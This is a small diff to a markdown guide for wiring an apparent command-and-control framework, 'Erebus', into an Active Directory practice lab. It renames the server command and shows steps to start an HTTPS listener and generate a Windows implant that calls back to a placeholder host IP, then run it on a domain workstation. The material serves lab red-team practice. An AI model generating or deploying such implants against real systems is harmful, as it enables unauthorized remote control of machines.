@@ -78,7 +78,7 @@ Typical GOAD-Light names (for reference when using Light instead of Mini):
 ## Erebus wiring (after VMs up)
 
 1. Note host IP reachable from lab network (often `192.168.56.1` for host-only).  
-2. `erebus serve` with HTTPS listener on that interface.  
+2. `erebus teamserver` with HTTPS listener on that interface.  
 3. `generate --os windows --sleep 500 --callback https://<HOST_IP>:443 --out implant.exe`  
 4. Run implant on domain workstation.  
 5. Manual path from `docs/GOLDEN_DEMO.md`.  
